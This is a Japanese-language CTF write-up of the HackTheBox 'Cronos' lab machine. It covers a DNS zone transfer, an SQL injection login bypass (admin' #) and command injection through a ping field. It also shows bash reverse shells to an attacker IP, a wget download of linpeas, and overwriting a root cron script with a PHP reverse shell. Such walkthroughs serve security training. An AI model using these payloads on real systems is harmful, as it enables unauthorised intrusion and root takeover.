+++
title = "HackTheBox - Cronos Writeup"
date = "2026-04-18"
description = "DNS Zone Transfer → SQLi認証バイパス → コマンドインジェクション → Cron JobによるPrivEsc"
tags = ["HackTheBox", "CTF", "Linux", "SQLinjection", "CommandInjection", "CronJob", "Medium"]
categories = ["HackTheBox"]
toc = true
draft = false
+++

## Machine Info

| Field | Details |
|-------|---------|
| Machine | Cronos |
| OS | Linux (Ubuntu 16.04) |
| IP | 10.129.227.211 |
| Difficulty | Medium |

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sV 10.129.227.211
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

Port 22 (SSH) / Port 53 (DNS) / Port 80 (HTTP) が開いている。
Port 53 が開いているため DNS ゾーン転送を試みる。

---

## DNS Enumeration

### 逆引きでホスト名を特定

```bash
nslookup
> server 10.129.227.211
> 10.129.227.211
```

```text
211.227.129.10.in-addr.arpa     name = ns1.cronos.htb.
```

### ゾーン転送

```bash
dig axfr cronos.htb @10.129.227.211
```

```text
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
cronos.htb.             604800  IN      NS      ns1.cronos.htb.
cronos.htb.             604800  IN      A       10.10.10.13
admin.cronos.htb.       604800  IN      A       10.10.10.13
ns1.cronos.htb.         604800  IN      A       10.10.10.13
www.cronos.htb.         604800  IN      A       10.10.10.13
```

サブドメインを発見。`/etc/hosts` に追加する。

```bash
echo "10.129.227.211 cronos.htb admin.cronos.htb www.cronos.htb ns1.cronos.htb" | sudo tee -a /etc/hosts
```

---

## Initial Access

### SQL Injection（認証バイパス）

`http://admin.cronos.htb` にアクセスするとログインフォームが表示される。

以下のペイロードで認証バイパスに成功。

```text
Username: admin' #
Password: （空欄）
```

ログイン後、`traceroute` / `ping` を実行できる Net Tool が表示される。

### Command Injection（RCE確認）

入力フィールドにセミコロンでコマンドを追記できる。

```text
8.8.8.8;id
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

`www-data` としてコマンドが実行されていることを確認。

---

## Listener

攻撃マシンで nc を起動。

```bash
nc -lvnp 4444
```

---

## Trigger

Net Tool のフィールドにリバースシェルを入力。

```bash
8.8.8.8;bash -c 'bash -i >& /dev/tcp/10.10.16.166/4444 0>&1'
```

---

## Foothold

```bash
whoami
```

```text
www-data
```

```text
connect to [10.10.16.166] from (UNKNOWN) [10.129.227.211] 35892
bash: cannot set terminal process group (1359): Inappropriate ioctl for device
bash: no job control in this shell
www-data@cronos:/var/www/admin$
```

---

## Post Exploitation

### sudo 確認

```bash
sudo -l
```

```text
sudo: no tty present and no askpass program specified
```

sudo は使用不可。

### linpeas による自動列挙

攻撃マシンで HTTP サーバーを起動して linpeas を転送。

```bash
python3 -m http.server 8000
```

```bash
cd /tmp
wget http://10.10.16.166:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh | tee /tmp/out.txt
```

### Cron Job の確認

```bash
grep -A 60 "Cron jobs" /tmp/out.txt
```

```text
* * * * *   root   php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
```

root が毎分 `/var/www/laravel/artisan` を実行していることを確認。

### ファイルの書き込み権限を確認

```bash
ls -la /var/www/laravel/artisan
```

```text
-rwxr-xr-x 1 www-data www-data 1646 Apr  9  2017 /var/www/laravel/artisan
```

所有者が `www-data` のため書き込み可能。

---

## Privilege Escalation

### artisan を上書きしてリバースシェルを仕込む

攻撃マシンで nc を起動。

```bash
nc -lvnp 5555
```

artisan にリバースシェルを書き込む。

```bash
echo '<?php exec("bash -c '\''bash -i >& /dev/tcp/10.10.16.166/5555 0>&1'\''"); ?>' > /var/www/laravel/artisan
```

1分以内に root の cron が artisan を実行し、シェルが返ってくる。

---

## Root Shell

```text
connect to [10.10.16.166] from (UNKNOWN) [10.129.227.211] 35962
bash: cannot set terminal process group (31349): Inappropriate ioctl for device
bash: no job control in this shell
root@cronos:~#
```

```bash
whoami
```

```text
root
```

---

## Flags

### User

```bash
cat /home/noulis/user.txt
```



### Root

```bash
cat /root/root.txt
```



---

## Summary

DNS Zone Transfer でサブドメイン `admin.cronos.htb` を発見 → SQL Injection で認証バイパス → コマンドインジェクションで `www-data` シェルを取得 → linpeas で root が毎分実行する Cron Job を発見 → 実行ファイルへの書き込み権限を確認 → artisan を上書きして root シェルを取得
